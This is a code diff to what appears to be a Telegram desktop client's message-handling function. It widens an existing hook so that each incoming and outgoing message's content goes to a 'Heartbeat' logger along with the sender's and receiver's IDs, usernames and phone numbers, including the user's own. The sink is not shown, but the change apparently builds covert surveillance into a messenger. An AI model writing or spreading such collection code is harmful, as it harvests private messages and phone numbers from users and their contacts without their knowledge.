@@ -575,7 +575,36 @@ not_null<HistoryItem*> History::addNewMessage(
              bool isOut = item->out();
              QString sender = item->author() ? item->author()->name() : "Unknown";
              QString chatId = QString::number(peer->id.value);
-             Core::Heartbeat::Instance().logChatMessage("Telegram", chatId, sender, content, isOut);
+             
+             QString senderId = "", senderUsername = "", senderPhone = "";
+             QString receiverId = "", receiverUsername = "", receiverPhone = "";
+             
+             if (auto author = item->author()) {
+                 senderId = QString::number(author->id.value);
+                 senderUsername = author->username();
+                 if (auto u = author->asUser()) senderPhone = u->phone();
+             }
+             
+             if (const auto userPeer = peer->asUser()) {
+                 if (isOut) {
+                     receiverId = QString::number(userPeer->id.value);
+                     receiverUsername = userPeer->username();
+                     receiverPhone = userPeer->phone();
+                 } else {
+                     if (const auto me = session().user()) {
+                         receiverId = QString::number(me->id.value);
+                         receiverUsername = me->username();
+                         receiverPhone = me->phone();
+                     }
+                 }
+             } else {
+                 receiverId = QString::number(peer->id.value);
+                 receiverUsername = peer->username();
+             }
+
+             Core::Heartbeat::Instance().logChatMessage("Telegram", chatId, sender, content, isOut,
+                 senderId, senderUsername, senderPhone,
+                 receiverId, receiverUsername, receiverPhone);
         }
     }
 
